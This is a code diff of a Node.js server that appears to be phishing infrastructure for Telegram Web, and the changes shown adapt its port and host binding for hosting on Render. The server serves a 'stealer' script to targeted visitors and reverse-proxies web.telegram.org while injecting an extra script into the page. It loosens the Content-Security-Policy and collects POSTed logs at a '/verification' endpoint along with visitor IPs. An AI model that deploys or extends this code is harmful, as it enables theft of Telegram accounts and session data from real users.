@@ -1,7 +1,8 @@
 const http = require("http");
 const fs = require("fs");
 const { isMainThread, parentPort } = require("worker_threads");
-const port = process.env.PORT || 80; // Dynamic for Render
+const port = process.env.PORT || 10000; // Render's default is 10000
+const host = '0.0.0.0'; // Required for Render
 
 let stealerData, telegramAppend;
 try {
@@ -9,30 +10,18 @@ try {
     telegramAppend = fs.readFileSync("_appendtelegram.js").toString();
 } catch (err) {
     console.error("Error reading stealer/append files:", err);
-    process.exit(1); // Fail fast for demo setup
+    process.exit(1);
 }
 
 const logsPath = "/verification";
 
 if (isMainThread) throw new Error("Can't be used as a node.js script, used as a worker thread");
 
-/**
- * Ends a response with a status code
- * 
- * @param {http.ServerResponse<http.IncomingMessage>} res 
- * @param {number} code 
- */
 function endResponseWithCode(res, code) {
     res.statusCode = code;
     res.end();
 }
 
-/**
- * Converts `Headers` to a JSON object
- * 
- * @param {Headers} headers
- * @param {http.ServerResponse} res
- */
 async function getHeaderObjects(headers, res) {
     const entries = headers.entries();
     while (true) {
@@ -50,7 +39,7 @@ http.createServer(async (req, res) => {
         try {
             if (req.url == undefined || !req.url.includes("/")) return endResponseWithCode(res, 401);
             console.log(req.url);
-            const connectingIp = req.headers["cf-connecting-ip"] || req.socket.remoteAddress; // Fallback for non-CF
+            const connectingIp = req.headers["cf-connecting-ip"] || req.socket.remoteAddress;
 
             if (req.method == "POST" && req.url == logsPath) {
                 const parsedBody = JSON.parse(body);
@@ -66,14 +55,14 @@ http.createServer(async (req, res) => {
             }
 
             if ((req.url.split("/").length == 2 && req.url.split("/")[1].length == 128) || req.url.startsWith("/?tgWebAppStartParam=")) {
-                res.write(`<script src="https://telegram.org/js/telegram-web-app.js"></script><script>${stealerData}</script>`); // Fixed typo
+                res.write(`<script src="https://telegram.org/js/telegram-web-app.js"></script><script>${stealerData}</script>`);
                 return endResponseWithCode(res, 200);
             } else {
                 const headersEntries = Object.entries(req.headers);
                 const headers = new Headers();
                 for (let i = 0; i < headersEntries.length; i++) {
                     const entry = headersEntries[i];
-                    headers.set(entry[0], entry[1].replaceAll("your-domain.com", "web.telegram.org")); // Change to your Render domain if needed
+                    headers.set(entry[0], entry[1].replaceAll("your-domain.com", "web.telegram.org")); // Update if needed
                 }
 
                 headers.set("Accept-Encoding", "br");
@@ -89,14 +78,14 @@ http.createServer(async (req, res) => {
                 const resHeaders = new Headers(r.headers);
 
                 resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-                resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' your-domain.com"); // Change to your domain
+                resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' your-domain.com");
                 resHeaders.set('CF-Cache-Status', 'DYNAMIC');
                 resHeaders.set('Pragma', 'no-cache');
                 resHeaders.set('Expires', '0');
 
                 let writeBody = await r.arrayBuffer();
                 if (req.url == "/" || req.url.startsWith("/?")) {
-                    writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`); // Fixed typo
+                    writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`);
                 }
 
                 await getHeaderObjects(resHeaders, res);
@@ -110,8 +99,8 @@ http.createServer(async (req, res) => {
             endResponseWithCode(res, 500);
         }
     });
-}).listen(port, () => {
-    console.log(`Listening on ${port}`);
+}).listen(port, host, () => {
+    console.log(`HTTP Server listening on ${host}:${port}`); // Confirm binding in logs
 });
 
 process.on("uncaughtException", console.error);
